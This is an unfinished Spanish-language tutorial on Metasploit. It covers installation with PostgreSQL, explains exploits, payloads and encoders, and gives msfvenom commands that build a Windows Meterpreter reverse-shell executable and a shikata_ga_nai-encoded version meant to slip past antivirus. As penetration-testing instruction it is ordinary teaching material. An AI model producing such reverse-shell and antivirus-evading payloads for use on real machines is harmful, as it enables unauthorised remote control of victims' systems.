
`EN CONSTRUCCIÓN !!!`

# Metasploit


# 1. Instalación

## 1.1 La base de datos

* Instalar `postgresql` y `postgresql-server`
* `systemctml start postgresql`

## 1.2 La aplicación

* Descargar paquete rpm de https://rpm.metasploit.com.
* `sudo rpm -i metasploit-framework-XXX.x86_64.rpm`
* `msfdb init`, crear el schema de la BBDD para MS.
* `msfconsole`, iniciar MS y comprobamos la BBDD.

```
david@camaleon> msfconsole

 ** Welcome to Metasploit Framework Initial Setup **
    Please answer a few questions to get started.


Would you like to use and setup a new database (recommended)?
Please answer yes or no.
Would you like to use and setup a new database (recommended)? yes
Creating database at /home/david/.msf4/db
Starting database at /home/david/.msf4/db...success
Creating database users
Creating initial database schema

 ** Metasploit Framework Initial Setup Complete **


 _                                                    _
/ \    /\         __                         _   __  /_/ __
| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\


       =[ metasploit v4.17.34-dev-                        ]
+ -- --=[ 1845 exploits - 1045 auxiliary - 320 post       ]
+ -- --=[ 541 payloads - 44 encoders - 10 nops            ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

msf > db_status
[*] postgresql connected to msf
msf > exit
```

> Resumen: Para iniciar MSF
> * `sudo systemctl start postgresql`
> * `msfdb init`
> * `msfconsole`

---

# 2. TEORÍA: Definiciones

* `msf> help`, ver los comandos de Metasploit

## 2.1 Los exploits

Un exploit es un fallo el cual se puede aprovechar para diferentes fines: como el control del sistema, robo de información, etc.

* `show exploits`, nos muestra todos los exploits.

> La base de datos de exploits se actualiza contínuamente con las nuevas vulnerabilidades que se van detectando.

## 2.2 Payloads

Los payloads son "bloques de código" que se cargan y ejecutan gracias a las vulnerabilidades. Con ellas podemos conseguir:
* la obtención de una Shell y tomar el control del sistema afectado o
* provocar un desbordamiento o saturación del sistema.

* `show payloads`, nos muestra todos los payloads.

Hay diferentes tipos de Payloads, según el sistema operativo o los servicios instalados:
* **Meterpreter** o Meta-Interpreter
    * Payload avanzado y multifacético que opera mediante inyección dll.
    * Reside completamente en la memoria del host remoto y no deja rastros en el disco duro, por lo que es muy difícil
    de detectar con técnicas forenses convencionales.
* **PassiveX**
    * Payload que ayudar a eludir los firewalls de salida restrictivos. Lo hace mediante el uso de un control ActiveX para crear una instancia oculta de Internet Explorer. Usando el nuevo control ActiveX, se comunica con el atacante a través de
    solicitudes y respuestas HTTP.
* **IPv6**
    * Diseñados para funcionar en redes que use el protocolo IPv6.

## 2.3 Encoders

Encargado de cifrar exploits, payload, etc.

* `search encoders`

---

# 3. TEORÍA: Generando Payloads

Con la herramienta `msfvenom` podemos generar nuestros propios Payloads para un objetivo específico. Además también los podemos exportar a varios formatos ejecutables y cifrarlo con cualquiera de los "encoder".


## 3.1 Ejemplo: shell inversa

```
msf > msfvenom
[*] exec: msfvenom

Usage: /opt/metasploit-framework/bin/../embedded/framework/msfvenom [options] <var=val>
Example: /opt/metasploit-framework/bin/../embedded/framework/msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe
...

msf > msfvenom -p windows/meterpreter/reverse_tcp
               LHOST=127.0.0.1
               LPORT=4444
               -f exe > shell.exe
```

| Parámetro | Descripción | Ejemplo |
| --------- | ----------- | ------- |
| -p        | Payload     | Para sistemas Windows |
| LHOST     | Nuestra IP local | 127.0.0.1 |
| LPORT     | Nuestro puerto local | 4444 |
| -f        | Formato de salida | Ejecutable shell.exe 32bits |

Cuando se ejecute este Payload tendremos una shell de Meterpreter reversa. Es decir, él se conectaría a nosotros y esta iría por el protocolo TCP.

## 3.2 Ejemplo: esconderse del antivirus

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f exe -e x86/shikata_ga_nai > shell.exe
```


* Este ejemplo es similar al anterior pero nuestro Payload esta cifrado por el encoder "shikata_ga_nai" para protegerse, por ejemplo, de los antivirus.
